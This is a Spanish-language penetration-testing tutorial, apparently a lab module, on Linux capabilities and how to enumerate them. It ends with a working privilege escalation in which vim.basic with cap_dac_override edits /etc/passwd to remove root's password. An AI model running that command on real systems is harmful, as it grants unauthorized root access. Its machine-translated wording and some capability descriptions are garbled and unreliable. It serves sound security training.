# Capacidades

---

Las capacidades de Linux son una característica de seguridad en el sistema operativo Linux que permite otorgar privilegios específicos a los procesos, lo que les permite realizar acciones específicas que de otro modo estarían restringidas. Esto permite un control más de grano fino sobre qué procesos tienen acceso a ciertos privilegios, lo que lo hace más seguro que el modelo UNIX tradicional de otorgar privilegios a los usuarios y grupos.

Sin embargo, como cualquier característica de seguridad, las capacidades de Linux no son invulnerables y pueden ser explotadas por atacantes. Una vulnerabilidad común es utilizar capacidades para otorgar privilegios a los procesos que no están arenados o aislados adecuadamente de otros procesos, lo que nos permite aumentar sus privilegios y obtener acceso a información confidencial o realizar acciones no autorizadas.

Otra posible vulnerabilidad es el uso indebido o el uso excesivo de las capacidades, lo que puede resultar en que los procesos tengan más privilegios de los que necesitan. Esto puede crear riesgos de seguridad innecesarios, ya que podríamos explotar estos privilegios para obtener acceso a información confidencial o realizar acciones no autorizadas.

En general, las capacidades de Linux pueden ser una característica de seguridad práctica, pero deben usarse cuidadosa y correctamente para evitar vulnerabilidades y posibles hazañas.

La configuración de las capacidades implica el uso de las herramientas y comandos apropiados para asignar capacidades específicas a los ejecutivos o programas. En Ubuntu, por ejemplo, podemos usar el`setcap`Comando para establecer capacidades para ejecutables específicos. Este comando nos permite especificar la capacidad que queremos establecer y el valor que queremos asignar.

Por ejemplo, podríamos usar el siguiente comando para establecer el`cap_net_bind_service`Capacidad para un ejecutable:

#### Capacidad establecida

  Capacidades

```shell-session
xnoxos@htb[/htb]$ sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic
```

Cuando las capacidades se establecen para un binario, significa que el binario podrá realizar acciones específicas que no podría realizar sin las capacidades. Por ejemplo, si el`cap_net_bind_service`La capacidad se establece para un binario, el binario podrá unirse a los puertos de red, lo cual es un privilegio que generalmente se restringe.

Algunas capacidades, como`cap_sys_admin`, que permite que un ejecutable realice acciones con privilegios administrativos, puede ser peligroso si no se usan correctamente. Por ejemplo, podríamos explotarlos para aumentar sus privilegios, obtener acceso a información confidencial o realizar acciones no autorizadas. Por lo tanto, es cruel establecer este tipo de capacidades para ejecutables correctamente de arena y aislada y evitar otorgarlos innecesariamente.

|**Capacidad**|**Descripción**|
|---|---|
|`cap_sys_admin`|Permite realizar acciones con privilegios administrativos, como modificar archivos del sistema o cambiar la configuración del sistema.|
|`cap_sys_chroot`|Permite cambiar el directorio raíz para el proceso actual, lo que le permite acceder a archivos y directorios que de otro modo serían inaccesibles.|
|`cap_sys_ptrace`|Permite adjuntar y depurar otros procesos, lo que puede permitirle obtener acceso a información confidencial o modificar el comportamiento de otros procesos.|
|`cap_sys_nice`|Permite aumentar o reducir la prioridad de los procesos, lo que potencialmente le permite obtener acceso a recursos que de otro modo estarían restringidos.|
|`cap_sys_time`|Permite modificar el reloj del sistema, lo que podría manipular las marcas de tiempo o hacer que otros procesos se comporten de manera inesperada.|
|`cap_sys_resource`|Permite modificar los límites de recursos del sistema, como el número máximo de descriptores de archivos abiertos o la cantidad máxima de memoria que se puede asignar.|
|`cap_sys_module`|Permite cargar y descargar módulos del núcleo, lo que puede modificar el comportamiento del sistema operativo o obtener acceso a información confidencial.|
|`cap_net_bind_service`|Permite vincularse a los puertos de red, lo que podría obtener acceso a información confidencial o realizar acciones no autorizadas.|

Cuando se ejecuta un binario con capacidades, puede realizar las acciones que permiten las capacidades. Sin embargo, no podrá realizar ninguna acción no permitida por las capacidades. Esto permite un control más de grano fino sobre los privilegios del binario y puede ayudar a prevenir vulnerabilidades de seguridad y acceso no autorizado a información confidencial.

Al usar el`setcap`Comando para establecer capacidades para un ejecutable en Linux, necesitamos especificar la capacidad que queremos establecer y el valor que queremos asignar. Los valores que usamos dependerán de la capacidad específica que estemos configurando y los privilegios que queremos otorgar a la ejecución.

Aquí hay algunos ejemplos de valores que podemos usar con el`setcap`comando, junto con una breve descripción de lo que hacen:

|**Valores de capacidad**|**Descripción**|
|---|---|
|`=`|Este valor establece la capacidad especificada para el ejecutable, pero no otorga ningún privilegio. Esto puede ser útil si queremos borrar una capacidad establecida previamente para el ejecutable.|
|`+ep`|Este valor otorga los privilegios efectivos y permitidos para la capacidad especificada a la ejecución. Esto permite que la ejecución realice las acciones que permite la capacidad pero no le permite realizar ninguna acción que no esté permitida por la capacidad.|
|`+ei`|Este valor otorga privilegios suficientes y hereditarios para la capacidad especificada a la ejecución. Esto permite que la ejecución realice las acciones que permite la capacidad y los procesos infantiles generados por la ejecución para heredar la capacidad y realizar las mismas acciones.|
|`+p`|Este valor otorga los privilegios permitidos para la capacidad especificada a la ejecución. Esto permite que la ejecución realice las acciones que permite la capacidad pero no le permite realizar ninguna acción que no esté permitida por la capacidad. Esto puede ser útil si queremos otorgar la capacidad a la ejecución, pero evitar que herede la capacidad o permita que los procesos infantiles la hereden.|

Se pueden utilizar varias capacidades de Linux para escalar los privilegios de un usuario a`root`, incluido:

|**Capacidad**|**Descripción**|
|---|---|
|`cap_setuid`|Permite que un proceso establezca su ID de usuario efectiva, que se puede utilizar para obtener los privilegios de otro usuario, incluido el`root`usuario.|
|`cap_setgid`|Permite establecer su ID de grupo efectiva, que se puede utilizar para obtener los privilegios de otro grupo, incluido el`root`grupo.|
|`cap_sys_admin`|Esta capacidad proporciona una amplia gama de privilegios administrativos, incluida la capacidad de realizar muchas acciones reservadas para el`root`Usuario, como modificar la configuración del sistema y los sistemas de archivos de montaje y desmontaje.|
|`cap_dac_override`|Permite el omitido de la lectura de archivos, escriba y ejecuta las verificaciones de permiso.|

---

## Capacidades enumeradoras

Es importante tener en cuenta que estas capacidades deben usarse con precaución y solo otorgarse a procesos de confianza, ya que pueden usarse mal para obtener acceso no autorizado al sistema. Para enumerar todas las capacidades existentes para todos los ejecutables binarios existentes en un sistema Linux, podemos usar el siguiente comando:

#### Capacidades enumeradoras

  Capacidades

```shell-session
xnoxos@htb[/htb]$ find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;

/usr/bin/vim.basic cap_dac_override=eip
/usr/bin/ping cap_net_raw=ep
/usr/bin/mtr-packet cap_net_raw=ep
```

Esta línea de unas usa el`find`Comandar para buscar todos los ejecutables binarios en los directorios donde se encuentran típicamente y luego usa el`-exec`bandera para ejecutar el`getcap`Comando en cada uno, mostrando las capacidades que se han establecido para ese binario. La salida de este comando mostrará una lista de todos los ejecutables binarios en el sistema, junto con las capacidades que se han establecido para cada uno.

---

## Explotación

Si obtuvimos acceso al sistema con una cuenta de bajo privilegio, descubrimos el`cap_dac_override`capacidad:

#### Capacidades de explotación

  Capacidades

```shell-session
xnoxos@htb[/htb]$ getcap /usr/bin/vim.basic

/usr/bin/vim.basic cap_dac_override=eip
```

Por ejemplo, el`/usr/bin/vim.basic`El binario se ejecuta sin privilegios especiales, como con`sudo`. Sin embargo, porque el binario tiene el`cap_dac_override`Conjunto de capacidad, puede escalar los privilegios del usuario que lo ejecuta. Esto permitiría que el probador de penetración gane el`cap_dac_override`capacidad y realizar tareas que requieren esta capacidad.

Echemos un vistazo al`/etc/passwd`Archivo donde el usuario`root`se especifica:

  Capacidades

```shell-session
xnoxos@htb[/htb]$ cat /etc/passwd | head -n1

root:x:0:0:root:/root:/bin/bash
```

Podemos usar el`cap_dac_override`capacidad de la`/usr/bin/vim`binario para modificar un archivo del sistema:

  Capacidades

```shell-session
xnoxos@htb[/htb]$ /usr/bin/vim.basic /etc/passwd
```

También podemos hacer estos cambios en un modo no interactivo:

  Capacidades

```shell-session
xnoxos@htb[/htb]$ echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
xnoxos@htb[/htb]$ cat /etc/passwd | head -n1

root::0:0:root:/root:/bin/bash
```

Ahora podemos ver que el`x`en esa línea se ha ido, lo que significa que podemos usar el comando`su`Iniciar sesión como root sin que se le pida la contraseña.